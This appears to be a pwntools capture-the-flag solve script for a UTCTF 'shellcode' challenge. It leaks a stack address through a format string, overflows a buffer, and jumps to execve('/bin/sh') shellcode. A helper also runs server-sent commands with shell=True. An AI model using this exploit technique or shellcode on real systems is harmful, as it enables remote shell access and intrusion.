from pwn import *

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
context.log_level = "DEBUG"

s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


def remote_pow(txt):
    t.recvuntil(txt)
    cmd = t.recvline()
    res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE).stdout
    t.sendline(res)


def check_addr_lsb(library, addr_str):
    with open(f"/proc/{t.pid}/maps", "r") as f:
        for l in f.readlines():
            if not library in l:
                continue
            assert l[12 - len(addr_str) :].startswith(addr_str)


def create_io() -> tubes.tube.tube:
    if local:
        if debug:
            if radare:
                io: tubes.tube.tube = process([elf_name], env={"LD_PRELOAD": libc_name})
                util.proc.wait_for_debugger(util.proc.pidof(io)[0])
                return io
            return gdb.debug([elf_name], script, env={"LD_PRELOAD": libc_name})
        return process([elf_name], env={"LD_PRELOAD": libc_name})
    return remote(remote_addr, int(remote_port))


def solve():
    global t
    sa = lambda x, y: t.sendafter(x, y)
    sla = lambda x, y: t.sendlineafter(x, y)

    buf = (
        b"%16$p".ljust(0x30, b"\0")
        + p64(0x601240)
        + p64(0x41424344)
        + p64(0xDEADBEEF)
        + p64(elf.sym["main"] + 1)
    )
    payload = b"".join(
        [
            (
                p8(e)
                if 0x80 <= e or not chr(e).isalpha()
                else p8(0x9B - e) if chr(e).isupper() else p8(0xDB - e)
            )
            for e in buf
        ]
    )
    sla(b":", buf)
    addr = int(t.recvuntil(b"<")[:-1], 16)
    buf = (
        b"\0" * 0x30
        + p64(0x601240)
        + p64(0x41424344)
        + p64(0xCAFEBABE)
        + p64(addr + 0x190)
        + b"\x90" * 0x200
        + asm(
            """
    xor rsi,rsi
	push rsi
	mov rdi,0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	push 59
	pop rax
	cdq
	syscall
    """
        )
    )
    sla(b":", buf)

    t.interactive()


local = 0
debug = 0
radare = 0

elf_name = "./shellcode"
libc_name = ""
addr = "challenge.utctf.live 9009"
if addr.count(" ") == 1:
    remote_addr, remote_port = addr.split()
if libc_name:
    libc: ELF = ELF(libc_name)
elf: ELF = ELF(elf_name)
script = """
b *main+270
c
"""
for _ in range(1):
    try:
        t = create_io()
        solve()
    except KeyboardInterrupt:
        break
    except AssertionError as e:
        continue
    except Exception as e:
        print(e)
    finally:
        t.close()
